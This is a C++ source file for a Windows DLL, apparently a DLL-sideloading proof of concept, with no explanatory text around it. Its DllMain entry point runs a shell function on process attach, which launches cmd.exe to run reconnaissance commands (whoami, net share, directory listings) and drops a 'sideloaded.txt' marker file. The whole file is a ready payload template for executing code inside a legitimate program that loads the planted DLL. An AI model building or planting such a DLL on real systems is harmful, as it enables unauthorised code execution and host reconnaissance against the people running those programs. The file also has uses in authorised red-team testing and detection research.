#include <iostream>
#include <processthreadsapi.h>
#include <memoryapi.h>

void shell() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    char cmd[] = "cmd.exe /K \"whoami & net share & dir & echo sideloaded > sideloaded.txt & cd .. & dir & exit\"";

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        shell();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }

    
    return TRUE;
}

